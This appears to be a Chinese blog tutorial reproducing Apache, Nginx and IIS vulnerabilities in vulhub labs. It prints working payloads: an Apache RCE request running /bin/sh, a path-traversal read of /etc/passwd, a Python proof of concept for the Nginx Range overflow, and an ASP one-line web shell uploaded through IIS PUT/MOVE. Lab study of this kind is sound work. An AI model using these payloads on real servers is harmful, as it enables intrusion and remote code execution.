<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>中间件安全 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="中间件安全" />
<meta property="og:description" content="中间件安全 vulhub漏洞复现：https://vulhub.org/操作教程：https://www.freebuf.com/sectool/226207.html 一、Apache Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。Apache是用C语言开发的基于模块化设计的web应用，核心代码不多。多数功能分散在各个模块中 1.Apache 解析漏洞（CVE-2017-15715) 影响版本：2.4.0~2.4.29
漏洞原理：apache这次解析漏洞的根本原因就是这个 ∗ ∗ ，正则表达式中，我们都知道 ** ，正则表达式中，我们都知道 ∗∗，正则表达式中，我们都知道用来匹配字符串结尾位置**
$符号: 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 &#39;\n&#39; 或 &#39;\r&#39; 要匹配 $ 字符本身，请使用\$ 如果设置MULTILINE标示，就当作换符处理，如果不设置就当作一行文本处理 本次实验是vulhub下的，所以找到apache配置文件，路径在/etc/apache2/ 下， apache2.conf 是apache核心配置文件查看其文件发现如下代码：意思是包含这两个文件下的以conf结尾的文件
IncludeOptional confenabled/*.conf IncludeOptional sitesenabled/*.conf 跟进该文件发现关于php的配置文件为docker-php.conf,打开为如下
&lt;FilesMatch \.php$&gt; SetHandler application/xhttpdphp &lt;/FilesMatch&gt; 可以看到在正则中是 .php , 因为结尾有个 ,因为结尾有个 ,因为结尾有个符号，结合上述原理，$匹配 ‘\n’ 或 ‘\r’，所以我们修改数据包在文件名后加\n，\n的十六进制为0a
首先查看index.php文件中的php源码
&lt;?php if(isset($_FILES[&#39;file&#39;])) { $name = basename($_POST[&#39;name&#39;]); $ext = pathinfo($name,PATHINFO_EXTENSION); if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) { exit(&#39;bad file&#39;); } move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/1979985df1baf200f2fe04606c2387bd/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-25T17:21:55+08:00" />
<meta property="article:modified_time" content="2024-01-25T17:21:55+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">中间件安全</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atelier-sulphurpool-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>中间件安全</h2> 
<ul><li><strong>vulhub漏洞复现：https://vulhub.org/</strong></li><li><strong>操作教程：https://www.freebuf.com/sectool/226207.html</strong></li></ul> 
<h4><a id="Apache_5"></a>一、Apache</h4> 
<ul><li>Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。</li><li>Apache是用C语言开发的基于模块化设计的web应用，核心代码不多。多数功能分散在各个模块中</li></ul> 
<h5><a id="1Apache_CVE201715715_10"></a>1.Apache 解析漏洞（CVE-2017-15715)</h5> 
<ul><li> <p>影响版本：2.4.0~2.4.29</p> </li><li> <p>漏洞原理：apache这次解析漏洞的根本原因就是这个 <strong><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
        
         
          
          
            ∗ 
           
          
            ∗ 
           
          
            ，正则表达式中，我们都知道 
           
          
         
           ** ，正则表达式中，我们都知道 
          
         
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4653em;"></span><span class="mord">∗</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.2222em;"></span></span><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord cjk_fallback">，正则表达式中，我们都知道</span></span></span></span></span>用来</strong>匹配字符串结尾位置**</p> <pre><code>$符号: 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 '\n' 或 '\r'
要匹配 $ 字符本身，请使用\$
如果设置MULTILINE标示，就当作换符处理，如果不设置就当作一行文本处理
</code></pre> </li><li> <p>本次实验是<strong>vulhub</strong>下的，所以找到apache配置文件，路径在/etc/apache2/ 下， <strong>apache2.conf</strong> 是apache核心配置文件查看其文件发现如下代码：意思是包含这两个文件下的以conf结尾的文件</p> <pre><code>IncludeOptional confenabled/*.conf
IncludeOptional sitesenabled/*.conf
</code></pre> </li><li> <p>跟进该文件发现关于php的配置文件为<strong>docker-php.conf</strong>,打开为如下</p> <pre><code>&lt;FilesMatch \.php$&gt;
	SetHandler application/xhttpdphp
			&lt;/FilesMatch&gt;
</code></pre> </li><li> <p>可以看到在正则中是 .php<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
       
        
         
         
           , 
          
         
           因为结尾有个 
          
         
        
          ,因为结尾有个 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.8778em; vertical-align: -0.1944em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord cjk_fallback">因为结尾有个</span></span></span></span></span>符号，结合上述原理，$匹配 ‘\n’ 或 ‘\r’，所以我们修改数据包在文件名后加\n，<strong>\n的十六进制为0a</strong></p> </li><li> <p>首先查看index.php文件中的php源码</p> <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>;
<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span>;
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php3'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phtml'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bad file'</span><span class="token punctuation">)</span>;
<span class="token punctuation">}</span>
<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./'</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span>;
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
  <ul><li>分析代码文件名<span class="katex--inline">KaTeX parse error: Undefined control sequence: \n at position 53: …POST接收不会去掉我们添加的\̲n̲,如果使用</span>_FILES[‘file’][‘name’] 去接收文件名，则会吧\n去掉，所以要满足此漏洞的条件之一就是使用POST接收文件名。</li><li>$ext等于POST中的文件名后缀，所以文件名不能是[‘php’, ‘php3’, ‘php4’, ‘php5’, ‘phtml’, ‘pht’]，但是可以是php\n的这种方式，就绕过了if判断。同时这样的文件还以被解析成PHP</li></ul> </li><li> <p>上传一个名为1.php的文件，被拦截：</p> <p><img src="https://images2.imgbox.com/59/9c/aT9KkIsa_o.jpg" alt="在这里插入图片描述"></p> </li><li> <p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是一个<code>\x0A</code>），不再拦截</p> <p><img src="https://images2.imgbox.com/26/67/D6hOJ2rw_o.jpg" alt="在这里插入图片描述"></p> </li><li> <p><strong>关于windows和Linux下这个利用是有区别的</strong></p> 
  <ul><li>linux：可以正常利用</li><li>windows：windows会产生warning的警告，因为涉及到文件读写，而windows操作系统不允许后缀以换行符结尾的文件命名方式，所以这里会文件会创建失败，就出现了这两个warning了，产生warning就证明已将绕过了。</li></ul> </li></ul> 
<h5><a id="2RCECVE202142013_72"></a>2.RCE（CVE-2021-42013）</h5> 
<ul><li> <p>影响版本：Apache 2.4.49 和 Apache 2.4.50</p> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/0d/cd/EJXweeia_o.png" alt="在这里插入图片描述"></p> </li><li> <p>任意命令执行</p> <pre><code>GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: 47.99.49.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=AE8DC398D32400BA213293A544A573BA
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT
If-None-Match: "2d-432a5e4a73a80"
Content-Length: 7

echo;id
</code></pre> <p><img src="https://images2.imgbox.com/e7/7d/i59rrDsK_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h5><a id="3CVE202141773_103"></a>3.路径穿越漏洞（CVE-2021-41773）</h5> 
<ul><li> <p>影响版本：Apache 2.4.49 和 Apache 2.4.50</p> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/78/93/b4AdMZ3v_o.png" alt="在这里插入图片描述"></p> </li><li> <p>文件读取</p> <pre><code>/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
</code></pre> <p><img src="https://images2.imgbox.com/be/d9/AVuaZWYm_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/3e/8b/nV0Wjb2W_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h4><a id="Nginx_124"></a>二、Nginx</h4> 
<ul><li>Nginx是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务</li></ul> 
<h5><a id="1CVE20134547_128"></a>1.解析漏洞（CVE-2013-4547）</h5> 
<ul><li> <p>漏洞原因：PHP配置文件中有一个参数是cgi.fix_pathinfo，如果参数<strong>cgi.fix_pathinfo=1</strong>，则产生该漏洞。关闭pathinfo的情况下，只有.php后缀的文件才会被发送给fastcgi解析。而存在CVE-2013-4547的情况下，我们请求<code>1.gif[0x20][0x00].php</code> ，这个URI可以匹配上正则 .php$，可以进入这个Location块；但进入后，由于fastcgi在查找文件时被\0截断，Nginx却错误地认为请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi</p> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/5d/91/ES0TFh7F_o.png" alt="在这里插入图片描述"></p> </li><li> <p>上传一个jpg文件，后面命名加一个空格</p> <p><img src="https://images2.imgbox.com/c4/89/4pJFvpXd_o.png" alt="在这里插入图片描述"></p> </li><li> <p>访问上传文件 <code>phpinfoa.gif[0x20][0x20].php</code>时，将文件修改为<code>phpinfoa.gif[0x20][0x00].php</code>；[0x20]为空格，[0x00]为\0（起到截断作用）</p> <p><img src="https://images2.imgbox.com/f3/99/63NjSAT6_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h5><a id="2CVE20177529_147"></a>2.整数溢出漏洞（CVE-2017-7529）</h5> 
<ul><li> <p>影响版本 Nginx 0.5.6 – 1.13.2</p> </li><li> <p>原理</p> 
  <ul><li>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。</li><li>如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。</li><li>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。</li><li>如果构造了两个负的位置，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</li></ul> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/10/6c/lFruebnL_o.png" alt="在这里插入图片描述"></p> </li><li> <p>POC</p> <pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> urllib3
<span class="token keyword">def</span> <span class="token function">cve20177529</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>

        <span class="token comment"># 构造请求头</span>

        headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"</span>
        <span class="token punctuation">}</span>
        url <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入目标URL:'</span><span class="token punctuation">)</span>

        <span class="token comment"># 获取正常响应的返回长度</span>

        <span class="token comment">#verify=False防止ssl证书校验，allow_redirects=False，防止跳转导致误报的出现</span>
        r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> 
        url_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>content<span class="token punctuation">)</span>

        <span class="token comment"># 将数据长度加长，大于返回的正常长度</span>

        addnum <span class="token operator">=</span> <span class="token number">200</span>
        final_len <span class="token operator">=</span> url_len <span class="token operator">+</span> addnum

        <span class="token comment"># 构造Range请求头，并加进headers中</span>

        <span class="token comment"># headers['Range'] = "bytes=-%d,-%d" % (final_len, 0x8000000000000000-final_len)</span>

        headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"</span><span class="token punctuation">,</span>
            <span class="token string">'Range'</span><span class="token punctuation">:</span><span class="token string">"bytes=-%d,-%d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>final_len<span class="token punctuation">,</span> <span class="token number">0x8000000000000000</span><span class="token operator">-</span>final_len<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token comment"># 用构造的新的headers发送请求包,并输出结果</span>

        r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        text <span class="token operator">=</span> r2<span class="token punctuation">.</span>text
        code <span class="token operator">=</span> r2<span class="token punctuation">.</span>status_code
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ETag'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> text <span class="token keyword">and</span> code <span class="token operator">==</span> <span class="token number">206</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'存在Nginx整数溢出漏洞（CVE-2017-7529）,已输出到cve20177529_log.txt'</span><span class="token punctuation">)</span>

            <span class="token comment"># 将结果输出到文本上</span>

            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'cve20177529_log.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'存在Nginx整数溢出漏洞（CVE-2017-7529）-------------'</span><span class="token operator">+</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'-------------\n'</span> <span class="token operator">+</span> r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>close
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'未检测到漏洞'</span><span class="token punctuation">)</span>

            <span class="token comment"># 将结果输出到文本上</span>

            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'cve20177529_log.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'未检测到漏洞-------------'</span><span class="token operator">+</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'-------------\n'</span> <span class="token operator">+</span> r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>close    
        
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> result<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>
    cve20177529<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <p><img src="https://images2.imgbox.com/06/cd/DezZvu13_o.png" alt="在这里插入图片描述"></p> <pre><code>存在Nginx整数溢出漏洞（CVE-2017-7529）-------------2024-01-20 15:27:15-------------

--00000000000000000002
Content-Type: text/html; charset=utf-8
Content-Range: bytes -200-611/612

, 20 Jan 2024 07:24:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 612
Last-Modified: Tue, 27 Jun 2017 13:40:50 GMT
Connection: close
ETag: "59526062-264"
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
&lt;style&gt;
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;
&lt;p&gt;If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.&lt;/p&gt;

&lt;p&gt;For online documentation and support please refer to
&lt;a href="http://nginx.org/"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;
Commercial support is available at
&lt;a href="http://nginx.com/"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;

--00000000000000000002
Content-Type: text/html; charset=utf-8
Content-Range: bytes -9223372036854774384-611/612
</code></pre> </li></ul> 
<h5><a id="3nginx_parsing_vulnerability_278"></a>3.解析漏洞（nginx_parsing_vulnerability）</h5> 
<ul><li> <p>一些配置错误的情况，与<strong>nginx、php版本</strong>无关；security.limit_extensions被设置为了空，故什么文件都是可以执行的，所以在防护的时候，需要将这个配置为<code>.php</code>（即：仅为.php的文件才能执行）</p> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/08/37/MWA61VTl_o.png" alt="在这里插入图片描述"></p> </li><li> <p>上传图片马，然后在访问返回的路径后面加上/.php</p> <p><img src="https://images2.imgbox.com/ad/9e/HyIFaxdi_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h4><a id="IIS_292"></a>三、IIS</h4> 
<ul><li>Internet Information Services（IIS，以前称为Internet Information Server）互联网信息服务是Microsoft公司提供的可扩展Web服务器，支持HTTP、HTTP/2、HTTPS、FTP、FTPS、SMTP和NNTP等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP Professional、Windows Server 2003和后续版本一起发行，但在Windows XP Home版本上并没有IIS。IIS目前只适用于Windows系统，不适用于其他操作系统</li><li>IIS默认的可执行文件除了<strong>asp</strong>还包含这三种 <strong>.asa .cer .cdx</strong></li></ul> 
<h5><a id="1_297"></a>1.短文件名漏洞</h5> 
<ul><li> <p><strong>IIS短文件名有以下几个特征：</strong></p> 
  <ul><li><strong>只有前六位字符直接显示</strong>，后续字符用~1指代。其中数字1还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）</li><li><strong>后缀名最长只有3位</strong>，多余的被截断，超过3位的长文件会生成短文件名</li><li><strong>所有小写字母均转换成大写字母</strong></li><li>长文件名中含有多个“.”，以文件名最后一个“.”作为短文件名后缀</li><li>长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件</li></ul> </li><li> <p>受影响版本</p> <pre><code>IIS 1.0，Windows NT 3.51 
IIS 3.0，Windows NT 4.0 Service Pack 2 
IIS 4.0，Windows NT 4.0选项包
IIS 5.0，Windows 2000 
IIS 5.1，Windows XP Professional和Windows XP Media Center Edition 
IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition 
IIS 7.0，Windows Server 2008和Windows Vista 
IIS 7.5，Windows 7（远程启用&lt;customErrors&gt;或没有web.config）
IIS 7.5，Windows 2008（经典管道模式）

注意：IIS使用.Net Framework 4时不受影响
</code></pre> </li><li> <p>工具利用</p> <pre><code>iis_shortname_Scan
python iis_shortname_Scan.py url
</code></pre> <p><img src="https://images2.imgbox.com/59/30/3ohNCzDP_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h5><a id="2_333"></a>2.上传解析漏洞</h5> 
<ul><li> <p>目录解析：以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行</p> 
  <ul><li> <p>创建一个glc.asp文件，查看显示效果</p> <pre><code class="prism language-asp">&lt;%=now() %&gt;
</code></pre> <p><img src="https://images2.imgbox.com/be/58/fhvpCLOF_o.png" alt="在这里插入图片描述"></p> </li><li> <p>修改为glc.txt，查看一下，代码并没有解析</p> <p><img src="https://images2.imgbox.com/d5/b9/4d9YAlRV_o.png" alt="在这里插入图片描述"></p> </li><li> <p>将glc.txt放在名为glc.asp的目录下，然后访问glc.txt，发现代码被成功解析</p> <p><img src="https://images2.imgbox.com/a7/f1/2QaW9eFf_o.png" alt="在这里插入图片描述"></p> </li></ul> </li><li> <p>文件解析：<code>xx.asp;.jpg</code> 像这种文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行</p> 
  <ul><li> <p>创建一个glc.asp;.jpg文件，代码被成功解析</p> <p><img src="https://images2.imgbox.com/a6/5a/D4nhwNRR_o.png" alt="在这里插入图片描述"></p> </li></ul> </li></ul> 
<h5><a id="3IIS_PUT_363"></a>3.IIS PUT漏洞</h5> 
<ul><li> <p>漏洞造成原因</p> <p>IIS Server在Web服务扩展中开启了WebDAV，配置了可以写入的权限，造成任意文件上传</p> </li><li> <p>把WebDAV设置为允许、然后网站主目录下设置可写入权限</p> <p><img src="https://images2.imgbox.com/54/d1/DGMgjQva_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/5e/22/InaY4XzJ_o.png" alt="在这里插入图片描述"></p> </li><li> <p>使用IISPutScanner工具查看是否存在put漏洞</p> <p><img src="https://images2.imgbox.com/24/6d/1xacahVP_o.png" alt="在这里插入图片描述"></p> </li><li> <p>将 <code>GET</code> 修改为 <code>OPTIONS</code> 查看可执行命令</p> <p><img src="https://images2.imgbox.com/c5/6d/hH5xKedw_o.png" alt="在这里插入图片描述"></p> </li><li> <p>使用PUT方法上传名为glc.txt的一句话mua，然后用MOVE方法更改文件名为glc.asp</p> <pre><code class="prism language-asp">&lt;%eval request("glc")%&gt;
</code></pre> <pre><code>PUT /glc.txt HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASPSESSIONIDSQQADAAC=FCLNHIICBNNOGELHGDJPBOGM
Upgrade-Insecure-Requests: 1
Content-Length: 23

&lt;%eval request("glc")%&gt;
</code></pre> <p><img src="https://images2.imgbox.com/ff/2d/YtTWwxwY_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/12/31/Jjii6bxy_o.png" alt="在这里插入图片描述"></p> <pre><code>MOVE /glc.txt HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASPSESSIONIDSQQADAAC=FCLNHIICBNNOGELHGDJPBOGM
Upgrade-Insecure-Requests: 1
Content-Length: 23
Destination: /glc.asp;.jpg

&lt;%eval request("glc")%&gt;
</code></pre> <p><img src="https://images2.imgbox.com/6f/4e/XmvJQ6AS_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/12/c7/NrLn2fBd_o.png" alt="在这里插入图片描述"></p> </li><li> <p>或者使用工具</p> <p><img src="https://images2.imgbox.com/72/9a/hmJ8lYbh_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h4><a id="Tomcat_441"></a>四、Tomcat</h4> 
<ul><li>Tomcat 服务器是一个<strong>免费的开放源代码的Web 应用服务器</strong>，属于<strong>轻量级应用服务器</strong>，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选</li><li>当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是<strong>独立运行</strong>的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的</li></ul> 
<h5><a id="1Tomcat_446"></a>1.Tomcat常见漏洞</h5> 
<pre><code>Tomcat AJP 文件包含漏洞
Tomcat弱口令
Tomcat反序列化漏洞(CVE-2016-8735)
